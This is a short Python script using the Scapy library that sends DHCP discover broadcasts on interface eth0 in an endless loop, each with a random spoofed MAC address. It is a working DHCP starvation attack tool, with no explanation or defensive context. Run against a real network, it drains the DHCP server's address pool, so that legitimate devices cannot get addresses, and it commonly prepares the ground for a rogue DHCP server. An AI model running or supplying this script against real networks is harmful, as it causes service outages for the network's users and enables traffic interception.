from scapy.all import *
import sys, random

def rand_mac():
    return bytes([random.randint(0, 255) for _ in range(6)])

while True:
    mac = rand_mac()
    sendp(
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac, xid=random.randint(0, 0xFFFFFFFF)) /
        DHCP(options=[("message-type","discover"),"end"]),
        iface="eth0", verbose=0
    )
    print(f"Discover sent with MAC {mac.hex()}")